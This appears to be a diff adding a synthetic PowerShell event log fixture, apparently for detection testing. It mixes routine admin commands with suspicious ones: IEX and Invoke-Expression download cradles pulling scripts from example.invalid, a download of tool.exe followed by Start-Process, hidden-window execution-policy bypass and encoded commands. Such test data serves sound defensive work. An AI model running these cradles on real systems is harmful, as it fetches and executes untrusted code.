@@ -1,0 +1,12 @@
+2026-11-20T09:10:15Z|4104|WS-ADMIN01|administrator|2480|powershell.exe|-NoProfile -File C:\Scripts\Inventory.ps1|Get-Process; Get-Service
+2026-11-20T09:12:30Z|4104|WS-USER05|user01|3120|powershell.exe|-EncodedCommand SQBFAFgA|IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/payload.ps1')
+2026-11-20T09:14:05Z|4688|WS-USER05|user01|3190|powershell.exe|-ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile|powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden
+2026-11-20T09:18:42Z|4104|WS-DEV02|developer|4280|powershell.exe|-Command Get-ChildItem C:\Projects|Get-ChildItem C:\Projects -Recurse
+2026-11-20T09:20:11Z|4104|WS-USER08|user08|5120|powershell.exe|-Command Invoke-WebRequest|Invoke-WebRequest -Uri http://example.invalid/tool.exe -OutFile C:\Temp\tool.exe
+2026-11-20T09:21:03Z|4104|WS-USER08|user08|5120|powershell.exe|-Command Start-Process|Start-Process C:\Temp\tool.exe
+2026-11-20T09:25:19Z|4688|WS-ADMIN02|administrator|6120|powershell.exe|-NoExit -Command Get-Service|powershell.exe -NoExit -Command Get-Service
+2026-11-20T09:29:40Z|4104|WS-USER10|user10|7120|powershell.exe|-Command Set-ExecutionPolicy Bypass|Set-ExecutionPolicy Bypass -Scope Process
+2026-11-20T09:32:50Z|4104|WS-USER12|user12|8120|powershell.exe|-Command FromBase64String|[Convert]::FromBase64String('VGVzdENvbW1hbmQ=')
+2026-11-20T09:35:10Z|4104|WS-ADMIN01|administrator|2480|powershell.exe|-File C:\Scripts\Backup.ps1|Copy-Item C:\Data D:\Backup -Recurse
+2026-11-20T09:38:22Z|4104|WS-USER15|user15|9120|powershell.exe|-Command Invoke-Expression|Invoke-Expression (New-Object Net.WebClient).DownloadString('http://example.invalid/script.ps1')
+2026-11-20T09:40:00Z|403|WS-ADMIN01|administrator|2480|powershell.exe|Engine stopped|PowerShell engine stopped
